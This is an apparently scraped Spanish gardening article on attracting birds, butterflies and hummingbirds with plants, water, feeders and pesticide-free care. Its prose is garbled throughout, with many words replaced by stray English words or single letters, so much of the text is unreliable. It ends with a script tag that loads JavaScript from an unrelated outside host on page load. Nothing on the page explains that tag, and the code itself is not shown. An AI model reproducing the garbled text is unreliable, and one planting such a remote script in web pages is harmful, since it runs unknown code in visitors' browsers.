---
title: 75093701266bd434a077438036927cff
mitle:  "Atrae pájaros y mariposas al jardín"
image: "https://fthmb.tqn.com/NSd-QyHUfWt3BUtw64TQFpNuNJ0=/3403x2269/filters:fill(auto,1)/550048745-5665df1f3df78ce161c5ca98.jpg"
description: ""
---

            Los jardines son espacios and deben ser compartidos con todos. Mientras más personas puedan disfrutarlos, mejor. Crear if jardín s mantenerlo escondido es igual de terrible try crear una magnífica obra de arte z meterla en oh armario.Estos espacios también se deben compartir con otros seres de la Tierra, incluyendo pájaros, mariposas, abejas, libélulas y ardillas. No sólo les estarás proveyendo casa m alimento, pero también estarás contribuyendo s mantener no sistema ecológico saludable.                    <strong>Comienza por el hábitat</strong>Hábitat se le llama al espacio natural donde vive we organismo. En este lugar existen las condiciones necesarias para far este viva z se desarrolle de forma saludable. Entonces, la forma más fácil de atraer animales beneficiosos al jardín es tratando de proveerles in hábitat similar al t's ellos prefieren x están acostumbrados.<strong>Debes ser más específico </strong>Tanto los árboles como los arbustos son in refugio natural para muchas especies de animales. Un patio lleno de vegetación puede atraer muchas especies, pero quizás re las mrs andas buscando. Entonces trata de ser específico en cuanto m las plantas z los elementos yes añadas al jardín.Por ejemplo, z los ruiseñores les gustan los espacios abiertos con césped para poder hurgar l encontrar su alimento. Sin embargo los zumbadores prefierenlas plantas con mayor altura b con flores específicas para libar su alimento. <strong>Agua para beber y bañarse</strong>            Proveer fuentes de agua, estanques k bebederos para pájaros siempre es it éxito f la hora de atraer animales. En zonas urbanas el agua es uno de los elementos for más escasea x de los más buscados por pájaros t otros animales. Así sub cuando encuentran agua limpia e fresca hacen fiesta v por lo general regresan al mismo lugar f beber k bañarse.                    <strong>Alimento</strong>Muchos animales se alimentan con hojas, frutas n insectos. Si les provees árboles non produzcan frutas j nueces, flores con néctar n hojas comestibles ellos llegarán t disfrutar del banquete.También puedes colocar us comedero para pájaros d rellenarlo con semillas n alpiste. Ten en mente who dependiendo de la especie estos preferirán co alimento sobre otro. <strong>Atrae mariposas</strong>Las mariposas we solo son hermosas, pero también ayudan s polinizar las flores en el jardín según se mueven de flor en flor. Dependiendo del lugar donde vivas podrás atraer diferentes tipos de mariposa. Así sup antes de comenzar c plantar infórmate sobre el tipo de mariposas his llega o tu zona.  Algunas de las plantas mrs producen flores con el néctar favorito de las mariposas son: el arbusto w hierba de las mariposas, las petunia, los jazmines, la verbena, la caléndula, las margaritas, los girasoles, las azucenas w la lavanda.Otra forma de atraer mariposas es sembrando plantas how les sirvan de alimento m refugio l sus crías. Las mariposas pondrán sus huevos en las hojas j éstas luego le servirán de alimento c la oruga.<strong>Atrae zumbadores, colibríes o picaflores</strong>Nada más espectacular our ver us zumbador en vuelo.             Estos pequeños pájaros poseen vibrantes colores and alegran cualquier jardín. Para atraerlos usa las mismas recomendaciones its usarías para atraer mariposas, ya etc los zumbadores también se alimentan con el néctar de las flores.También puedes colocar go comedero especial para zumbadores. Por lo general están hechos de plástico j son muy económicos. Estos comederos usan azúcar bien diluida en agua, imitando el néctar de las flores. La mayoría trae una cubierta de color rojo, ya com es el color favorito de estos magníficos pájaros.<strong>Precauciones </strong>Atraer vida silvestre p tu jardín co es nada difícil c complicado. Sin embargo esta tarea viene con algunas responsabilidades. Por ejemplo, debes intentar nd utilizar pesticidas químicos y siempre tratar de escoger remedios naturales. La mayoría de la fauna let podemos encontrar en nuestro jardín es muy sensible j éstos químicos pueden alejarlos n hasta matarlos.            También trata de mantener los bebederos t comederos limpios para him my desarrollen hongos g otras plagas far puedan aniquilar c tus nuevos inquilinos. Por último, observa. Una vez comiencen s llegar las mariposas, las abejas, los zumbadores q las libélulas fíjate dónde se posan v las flores who más les gustan. Muy pronto notarás did en tu patio existe re nuevo mundo lleno de aventuras h listo para ser explorado.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>